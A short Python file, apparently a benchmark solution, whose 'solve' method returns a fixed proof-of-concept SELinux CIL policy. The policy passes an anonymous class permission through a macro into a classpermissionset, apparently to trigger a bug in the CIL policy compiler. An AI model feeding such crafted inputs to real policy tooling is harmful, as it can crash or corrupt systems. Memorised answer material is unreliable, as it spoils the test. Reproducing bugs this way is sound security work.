class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'''(class testclass (read write execute append lock ioctl))
(macro badmacro ((classpermission cp))
  (classpermissionset badset testclass cp)
)
(badmacro (class testclass (read append)))
'''
        return poc
